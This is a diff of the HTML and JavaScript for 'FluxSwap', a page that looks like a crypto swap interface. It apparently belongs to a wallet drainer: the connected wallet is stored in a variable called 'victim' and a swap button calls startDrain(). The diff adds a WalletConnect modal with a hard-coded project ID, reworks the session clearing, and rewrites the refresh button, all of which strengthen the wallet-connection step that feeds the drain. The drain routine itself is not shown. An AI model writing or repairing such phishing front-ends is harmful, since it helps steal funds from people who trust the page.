@@ -6,6 +6,7 @@
     <title>FluxSwap</title>
     <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm" />
     <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm" />
+    <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm" />
     <link rel="preconnect" href="https://api.coingecko.com" />
     <link rel="preconnect" href="https://verify.walletconnect.com" />
     <link rel="dns-prefetch" href="https://api.coingecko.com" />
@@ -13,7 +14,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* (ваши стили – для краткости опущены, они идентичны предыдущим) */
+        /* (ваши стили – без изменений) */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -99,7 +100,7 @@
     </style>
 </head>
 <body>
-    <!-- HTML-разметка ваша (без изменений) – карточка, модалки, кнопки -->
+    <!-- HTML-разметка (ваша) -->
     <div class="card">
         <div class="header">
             <div class="header-brand">
@@ -208,12 +209,13 @@
         </div>
     </div>
 
-    <!-- ===== ESM-МОДУЛИ ===== -->
+    <!-- ===== ESM-МОДУЛИ (с @walletconnect/modal) ===== -->
     <script type="importmap">
     {
         "imports": {
             "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm",
-            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm"
+            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm",
+            "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm"
         }
     }
     </script>
@@ -221,12 +223,23 @@
     <script type="module">
         import { ethers } from 'ethers';
         import { EthereumProvider } from '@walletconnect/ethereum-provider';
+        import { WalletConnectModal } from '@walletconnect/modal';
 
         window.ethers = ethers;
         window.WalletConnectProvider = EthereumProvider;
+
+        const modal = new WalletConnectModal({
+            projectId: '2c94255cd6cb3dd91ea6f447bbe7d3c9',
+            themeMode: 'dark',
+            themeVariables: {
+                '--wcm-z-index': '1000',
+                '--wcm-accent-color': '#8b5cf6',
+            }
+        });
+        window._wcModal = modal;
+
         console.log('✅ ESM libraries loaded');
-        
-        // Запускаем приложение, если DOM готов
+
         document.addEventListener('DOMContentLoaded', () => {
             if (typeof window.initApp === 'function') window.initApp();
         });
@@ -238,7 +251,7 @@
     <script>
         // ===== ОСНОВНОЙ СКРИПТ =====
         window.initApp = function() {
-            if (typeof ethers === 'undefined' || typeof window.WalletConnectProvider === 'undefined') {
+            if (typeof ethers === 'undefined' || typeof window.WalletConnectProvider === 'undefined' || typeof window._wcModal === 'undefined') {
                 document.getElementById('status').textContent = '❌ Библиотеки не загружены. Перезагрузите страницу.';
                 document.getElementById('status').className = 'status err';
                 return;
@@ -429,24 +442,27 @@
                         try { await wcProvider.disconnect(); } catch (_) {}
                         wcProvider = null;
                     }
-                    // Удаляем все записи WalletConnect из storage
-                    const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
-                    for (const pattern of patterns) {
-                        for (let i = localStorage.length - 1; i >= 0; i--) {
-                            const key = localStorage.key(i);
-                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
+                    // Полная очистка localStorage и sessionStorage
+                    const allKeys = Object.keys(localStorage);
+                    for (const key of allKeys) {
+                        if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
+                            localStorage.removeItem(key);
                         }
-                        for (let i = sessionStorage.length - 1; i >= 0; i--) {
-                            const key = sessionStorage.key(i);
-                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
-                        }
-                        document.cookie.split(';').forEach(cookie => {
-                            const [name] = cookie.trim().split('=');
-                            if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
-                                document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-                            }
-                        });
                     }
+                    const sKeys = Object.keys(sessionStorage);
+                    for (const key of sKeys) {
+                        if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
+                            sessionStorage.removeItem(key);
+                        }
+                    }
+                    // Удаляем куки
+                    document.cookie.split(';').forEach(cookie => {
+                        const [name] = cookie.trim().split('=');
+                        if (name && (name.toLowerCase().includes('walletconnect') || name.toLowerCase().includes('wc@'))) {
+                            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+                        }
+                    });
+                    // Удаляем IndexedDB
                     try {
                         const dbs = await indexedDB.databases();
                         for (const db of dbs) {
@@ -459,13 +475,15 @@
                             }
                         }
                     } catch (_) {}
+                    // Сброс переменных
                     provider = null; signer = null; victim = null; chainId = null;
                     isConnected = false; isProcessing = false; isConnecting = false;
+                    wcProvider = null;
                     if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (без предварительной инициализации) =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (через @walletconnect/modal) =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -473,8 +491,9 @@
                 await forceClearSession();
 
                 const EthereumProvider = window.WalletConnectProvider;
-                if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect library not loaded. Please refresh.', 'err');
+                const modal = window._wcModal;
+                if (!EthereumProvider || !modal) {
+                    setStatus('❌ Библиотеки не загружены. Перезагрузите.', 'err');
                     return;
                 }
 
@@ -482,11 +501,10 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
-                    // Создаём провайдер по требованию
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         optionalChains: [1, 56, 137, 42161],
-                        showQrModal: true,
+                        modal: modal,
                         metadata: {
                             name: 'FluxSwap',
                             description: 'Swap interface',
@@ -495,14 +513,12 @@
                         }
                     });
 
-                    // Явно вызываем enable для показа QR
                     if (typeof wcProvider.enable === 'function') {
                         console.log('Calling wcProvider.enable()...');
                         await wcProvider.enable();
                         console.log('enable() finished');
                     }
 
-                    // События
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -534,13 +550,11 @@
                     setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     isConnecting = false;
 
-                    // После успешного подключения обновляем курсы
                     updateRateAndOutput();
 
                 } catch (e) {
                     console.error('WalletConnect error:', e);
                     const msg = e.message || '';
-                    // Если ошибка связана с origin – даём понятную подсказку
                     if (msg.includes('origin not allowed') || msg.includes('3000')) {
                         setStatus('❌ Домен не разрешён в WalletConnect Cloud. Добавьте fluxswap.online в Allowed Origins.', 'err');
                     } else {
@@ -595,7 +609,7 @@
                 }
             }
 
-            // ===== ОБРАБОТЧИКИ С ЛОГАМИ =====
+            // ===== ОБРАБОТЧИКИ =====
             connectBtn.addEventListener('click', function() { 
                 console.log('Connect button clicked');
                 openModal(walletModal); 
@@ -625,6 +639,29 @@
                 startDrain();
             });
 
+            // ===== ИСПРАВЛЕННАЯ КНОПКА REFRESH =====
+            refreshBtn.addEventListener('click', async function() {
+                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+                await forceClearSession();
+                // Сброс всех переменных
+                isConnected = false;
+                isConnecting = false;
+                isProcessing = false;
+                wcProvider = null;
+                provider = null;
+                signer = null;
+                victim = null;
+                chainId = null;
+                inputAmount.value = '';
+                outputAmount.value = '';
+                updateConnectButton();
+                setStatus('Session reset. Reloading...', '');
+                closeModal(walletModal);
+                closeModal(tokenModal);
+                // Перезагрузка страницы для полного сброса
+                window.location.reload();
+            });
+
             // ===== MAX =====
             function handleMaxClick() {
                 const amount = 0.001;
@@ -639,18 +676,6 @@
 
             inputAmount.addEventListener('input', function() {
                 updateSwapButton();
-                updateRateAndOutput();
-            });
-
-            refreshBtn.addEventListener('click', async function() {
-                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-                await forceClearSession();
-                inputAmount.value = '';
-                outputAmount.value = '';
-                updateConnectButton();
-                setStatus('Session reset', '');
-                closeModal(walletModal);
-                closeModal(tokenModal);
                 updateRateAndOutput();
             });
 
@@ -718,7 +743,6 @@
                 await forceClearSession();
                 updateConnectButton();
                 setStatus('Connect wallet to start swapping', '');
-                // Курсы загружаем через 2 секунды, не блокируя интерфейс
                 setTimeout(() => updateRateAndOutput(), 2000);
 
                 if (typeof ethers === 'undefined') {
@@ -731,6 +755,12 @@
                     console.warn('⚠️ WalletConnect not loaded yet');
                 } else {
                     console.log('✅ WalletConnect loaded');
+                }
+
+                if (typeof window._wcModal === 'undefined') {
+                    console.warn('⚠️ Modal not loaded yet');
+                } else {
+                    console.log('✅ Modal loaded');
                 }
 
                 const params = new URLSearchParams(window.location.search);
